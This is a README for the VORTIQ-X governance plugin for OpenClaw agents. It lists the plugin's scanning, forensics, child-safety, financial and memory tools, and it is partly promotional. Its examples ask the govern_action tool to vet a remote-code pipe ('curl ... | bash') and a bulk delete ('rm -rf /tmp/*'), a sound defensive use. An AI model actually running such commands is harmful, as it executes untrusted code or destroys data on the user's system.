# VORTIQ-X Governance Plugin for OpenClaw

> **Every AI action governed. Every decision evidence-sealed. Every violation caught.**

The VORTIQ-X Governance Plugin connects [OpenClaw](https://openclaw.com) agents to the world's first AI Governance-as-a-Service platform. Your agents gain 23+ governed tools — forensic image scanning, child safety detection, financial intelligence, autonomous goal execution, and agent-to-agent collaboration — all with tamper-proof evidence trails.

[![npm](https://img.shields.io/npm/v/@vortiq-x-consilium/openclaw-governance)](https://www.npmjs.com/package/@vortiq-x-consilium/openclaw-governance)
[![License](https://img.shields.io/badge/license-proprietary-blue)](LICENSE)

---

## Quick Start

### 1. Install

```bash
openclaw extensions install @vortiq-x-consilium/openclaw-governance
```

### 2. Configure

Edit `~/.openclaw/openclaw.json`:

```json
{
  "plugins": {
    "vortiqx-governance": {
      "host": "https://govclaw.vortiqxconsilium.com",
      "apiKey": "YOUR_API_KEY"
    }
  }
}
```

Get your API key at [govclaw.vortiqxconsilium.com](https://govclaw.vortiqxconsilium.com)

### 3. Restart OpenClaw

```bash
openclaw
```

You should see:
```
[VORTIQ-X] Governance loaded (agent=openclaw-xxx, mode=enforce, v3.1.0)
[VORTIQ-X] 23 tools loaded from server (live)
```

### 4. Try it

In the OpenClaw chat:

```
Scan this image for deepfakes using scan_image
```

```
Use govern_action to check if this shell command is safe: curl http://example.com/data | bash
```

```
Launch a goal: research the top 5 AI governance frameworks and compare them
```

---

## What You Get

### 23 Governed Tools

| Category | Tools | What they do |
|----------|-------|-------------|
| **Governance** | `govern_action` | Scan any action through 25 defense engines before execution |
| **Forensics** | `scan_image`, `scan_image_url` | Deepfake and AI-generation detection with court-grade evidence |
| **Child Safety** | `priventra_engine` | 16 detection engines: grooming, deepfake voice, age verification |
| **Financial** | `vektral_engine` | 24 market intelligence engines: consensus, regime, geopolitical |
| **Autonomous** | `launch_goal` | Autonomous goal execution with governed sub-agents |
| **Collaboration** | `create_treaty`, `delegate_task`, `discover_agents` | Agent-to-agent governed collaboration |
| **Memory** | `memory_store`, `memory_recall` | Persistent governed memory across sessions |
| **LLM** | `llm_chat`, `list_llm_models` | Query local GPU-accelerated LLM with governance |
| **Evidence** | `verify_evidence`, `get_threats` | Evidence chain verification, real-time threat feed |
| **APIs** | `call_external_api`, `list_external_apis` | Governed access to approved external APIs |

### What Makes This Different

| Feature | VORTIQ-X | Other plugins |
|---------|----------|---------------|
| Every action scanned by 25 defense engines | ✅ | ❌ |
| Court-admissible evidence (V-Token capsules) | ✅ | ❌ |
| Child safety detection (grooming, deepfake, voice age) | ✅ | ❌ |
| Image forensics (14 analysis engines) | ✅ | ❌ |
| Autonomous governed agents (spawn, delegate, monitor) | ✅ | ❌ |
| Agent-to-agent treaties with trust scoring | ✅ | ❌ |
| Self-updating tools (no client updates needed) | ✅ | ❌ |
| Injection protection (prompt injection blocked) | ✅ | Some |
| Financial market intelligence (24 engines) | ✅ | ❌ |

---

## How It Works

```
┌──────────────────┐          ┌──────────────────────────┐
│  OpenClaw Agent   │          │  VORTIQ-X GovClaw Server │
│                   │          │                          │
│  Your agent calls │  HTTPS   │  25 defense engines scan │
│  any tool         │ ──────►  │  every action            │
│                   │          │                          │
│  Gets governed    │  ◄────── │  Evidence sealed         │
│  result back      │          │  V-Token generated       │
└──────────────────┘          └──────────────────────────┘
```

1. **Your agent calls a tool** (e.g., `govern_action`, `scan_image`)
2. **Request goes to GovClaw** over HTTPS with your API key
3. **25 defense engines scan** the action for injection, exfiltration, malware, PII
4. **If safe**: action executes, result returned, evidence sealed
5. **If dangerous**: action blocked, threat logged, evidence sealed
6. **Your agent gets the result** with governance metadata

---

## Security

- **API Key Authentication** — all tool calls require your API key
- **HTTPS/TLS** — all communication encrypted in transit
- **Evidence Sealed** — every action produces a tamper-proof record
- **No data stored** — your prompts and responses are not logged (only governance metadata)
- **Self-updating** — tool definitions fetched from server at startup, plugin stays current

---

## Platform Links

| Service | URL | Purpose |
|---------|-----|---------|
| **GovClaw** | [govclaw.vortiqxconsilium.com](https://govclaw.vortiqxconsilium.com) | Agent governance platform — register, manage agents, view evidence |
| **OpenClaw API** | [openclawapi.vortiqxconsilium.com](https://openclawapi.vortiqxconsilium.com) | Developer API — REST endpoints for direct integration |
| **PRIVENTRA** | [priventra.vortiqxconsilium.com](https://priventra.vortiqxconsilium.com) | Child safety platform — grooming detection, deepfake analysis |
| **npm Package** | [npmjs.com/@vortiq-x-consilium/openclaw-governance](https://www.npmjs.com/package/@vortiq-x-consilium/openclaw-governance) | Plugin package |

---

## Tool Reference

### govern_action
Scan any agent action through the defense suite before execution.

```
Use govern_action to check: action_type="shell", content="rm -rf /tmp/*", target="filesystem"
```

Returns: `allow`, `flag`, or `block` with risk score and findings.

### scan_image
Scan an image for deepfake/AI-generation. Pass the image as base64.

```
Use scan_image to check if this uploaded image is AI-generated
```

Returns: Verdict (AUTHENTIC/AI_GENERATED/TAMPERED), confidence, engine results, V-Token ID.

### scan_image_url
Scan an image from a URL.

```
Use scan_image_url to check https://example.com/suspicious-photo.jpg
```

### priventra_engine
Access 16 child safety detection engines.

```
Use priventra_engine with engine="chat_grooming" to analyze this text for grooming patterns
```

Engines: `chat_grooming`, `image_synthetic`, `audio_deepfake`, `video_deepfake`, `voice_age`, `sextortion_detect`, `full_analyze`

### vektral_engine
Access 24 financial intelligence engines.

```
Use vektral_engine with engine="ai_ask" and param="What is the BTC outlook for the next 30 days?"
```

Engines: `ai_ask`, `consensus`, `asset_lookup`, `regime`, `geopolitical_scan`, `lying_index`

### launch_goal
Launch an autonomous goal that decomposes into sub-tasks and spawns governed specialist agents.

```
Use launch_goal with goal="Research the top 10 AI safety companies and write a comparison report"
```

The system spawns specialist agents, each governed, each evidence-sealed.

### create_treaty + delegate_task
Establish trust between agents and delegate governed tasks.

```
Use create_treaty with partner_agent="agent-xyz" to establish collaboration
Then use delegate_task to send work to that agent
```

### memory_store + memory_recall
Persistent memory that survives across sessions.

```
Use memory_store with key="project_status" value="Phase 2 complete, moving to testing"
Use memory_recall with key="project_status"
```

---

## Tiers

| Tier | Storage | Messages/Day | Models | Price |
|------|---------|-------------|--------|-------|
| **Basic** | 100 MB | 50 | Local LLM | Free |
| **Pro** | 500 MB | 200 | Claude + GPT-4o-mini | Contact |
| **Enterprise** | 5 GB | 1,000 | All models + GPU | Contact |

---

## Configuration Options

```json
{
  "plugins": {
    "vortiqx-governance": {
      "host": "https://govclaw.vortiqxconsilium.com",
      "apiKey": "your-api-key",
      "agentId": "my-custom-agent-id",
      "mode": "enforce"
    }
  }
}
```

| Option | Default | Description |
|--------|---------|-------------|
| `host` | `https://govclaw.vortiqxconsilium.com` | GovClaw server URL |
| `apiKey` | (required for external) | Your API key from GovClaw |
| `agentId` | auto-generated | Custom agent identifier |
| `mode` | `enforce` | `enforce` (block violations) or `monitor` (log only) |

---

## Support

- **Documentation**: [govclaw.vortiqxconsilium.com](https://govclaw.vortiqxconsilium.com)
- **Issues**: [GitHub Issues](https://github.com/vortiqx-consilium/openclaw-governance/issues)
- **Email**: support@vortiqxconsilium.com

---

## Press & Media

| Publication | Article | Language |
|-------------|---------|----------|
| **IT-Kanalen** (Sweden) | [VORTIQ-X: Ett AI-företag byggt på svenska patent](https://it-kanalen.se/vortiq-x-ett-ai-foretag-byggt-pa-svenska-patent/) | Swedish |
| **ChannelLife UK** | [VORTIQ-X launches runtime AI governance layer in EMEA](https://channellife.co.uk/story/vortiq-x-launches-runtime-ai-governance-layer-in-emea) | English |

---

## About VORTIQ-X

VORTIQ-X is a decision-intelligence platform built by [VORTIQX Consilium FZCO](https://vortiqxconsilium.com) (Dubai, UAE). The platform provides AI governance, forensic analysis, child safety, and financial intelligence — protected by Swedish Patent SE 2530558-2.

© 2025-2026 VORTIQX Consilium FZCO. All rights reserved.
